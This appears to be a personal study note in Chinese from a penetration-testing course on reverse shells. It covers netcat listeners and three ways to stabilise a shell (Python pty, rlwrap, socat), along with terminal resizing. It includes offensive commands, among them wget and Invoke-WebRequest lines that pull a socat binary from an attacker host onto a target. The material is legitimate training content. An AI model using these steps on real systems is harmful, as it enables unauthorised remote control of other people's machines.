Reverse shell listen:
nc -nlvp \[PORT]
	 -l 用于告诉 netcat 这将是一个侦听器
    -v 用于请求详细输出
    -n 告诉 netcat 不要解析主机名或使用 DNS。
    -p 表示将遵循端口规范。
Netcat Shell Stabilisation：
```
默认情况下，这些 shell 非常不稳定。按 Ctrl + C 会杀死整个事情。它们是非交互式的，并且经常有奇怪的格式错误。这是因为 netcat 的“shell”实际上是在终端内运行的进程，而不是真正的终端。幸运的是，有很多方法可以稳定 Linux 系统上的 netcat shell。我们将在这里看三个。Windows 反向 shell 的稳定性往往要困难得多;但是，我们将在这里介绍的第二种技术对它特别有用。
```
 _技术 1：Python_
	\1. 首先要做的是使用 `python -c 'import pty;pty.spawn("/bin/bash")'` ，它使用 Python 生成功能更好的 bash shell;请注意，某些目标可能需要指定的 Python 版本。如果是这种情况，请根据需要将 `python` 替换为 `python2` 或 `python3` 。在这一点上，我们的 shell 看起来会更漂亮一些，但我们仍然无法使用 tab 自动完成或箭头键，并且 Ctrl + C 仍然会杀死 shell。
	2.第二步是： `export TERM=xterm` -- 这将使我们能够访问术语命令，例如 `clear` 。
	3.最后（也是最重要的）我们将使用 Ctrl + Z 对 shell 进行背景处理。回到我们自己的终端中，我们使用 `stty raw -echo; fg` 。这做了两件事：首先，它关闭了我们自己的终端回显（它使我们能够访问 Tab 自动完成、箭头键和 Ctrl + C 来终止进程）。然后，它使shell成为前景，从而完成该过程。
	![[Pasted image 20231208172838.png]]
	请注意，如果 shell died，您自己的终端中的任何输入都将不可见（由于禁用了终端回显）。若要解决此问题，请键入 `reset` 并按 Enter。
_技术 2：rlwrap_
	rlwrap是一个程序，简单来说，它使我们能够在收到 shell 后立即访问历史记录、Tab 自动完成和箭头键;但是，如果您希望能够在 shell 内使用 Ctrl + C，仍必须使用一些手动稳定功能。默认情况下，Kali 上未安装 rlwrap，因此请先使用 `sudo apt install rlwrap` 安装它。
	为了使用 rlwrap，我们调用了一个稍微不同的侦听器：
	`rlwrap nc -lvnp <port>`
	在 netcat 监听器前面加上 “rlwrap” 为我们提供了一个功能更全面的 shell。这种技术在处理 Windows shell 时特别有用，否则很难稳定。在处理 Linux 目标时，可以使用与上一种技术的第三步相同的技巧来完全稳定：使用 Ctrl + Z 使 shell 进入后台，然后使用 `stty raw -echo; fg` 稳定并重新进入 shell。
_技术3：socat
	稳定 shell 的第三种简单方法是使用初始 netcat shell 作为进入功能更全面的 socat shell 的垫脚石。请记住，此技术仅限于 Linux 目标，因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定。为了实现这种稳定方法，我们首先将 socat 静态编译的二进制文件（编译为没有依赖关系的程序版本）传输到目标机器。实现此目的的典型方法是在攻击计算机上包含 socat 二进制文件 （ `sudo python3 -m http.server 80` ） 的目录中使用 Web 服务器，然后在目标计算机上使用 netcat shell 下载文件。在Linux上，这将通过curl或wget（ `wget <LOCAL-IP>/socat -O /tmp/socat` ）完成。
	-----------------------------------------
	为了完整起见：在Windows CLI环境中，可以使用Invoke-WebRequest或webrequest系统类使用Powershell完成相同的操作，具体取决于安装的Powershell版本（ `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe` ）。在即将到来的任务中，我们将介绍使用 Socat 发送和接收 shell 的语法。
使用上述任何一种技术，能够更改终端 tty 大小都很有用。这是您的终端在使用常规 shell 时会自动执行的操作;但是，如果要使用覆盖屏幕上所有内容的文本编辑器之类的东西，则必须在反向或绑定 shell 中手动完成。
首先，打开另一个终端并运行 `stty -a` 。这将为您提供大量输出。记下“rows”和 columns 的值：
![[Pasted image 20231208173926.png]]
接下来，在反向/绑定 shell 中，键入：
`stty rows <number>`  
and 和
`stty cols <number>`
填写您在自己的终端中运行命令后获得的数字。这将改变终端的注册宽度和高度，从而允许依赖此类信息准确的文本编辑器等程序正确打开。
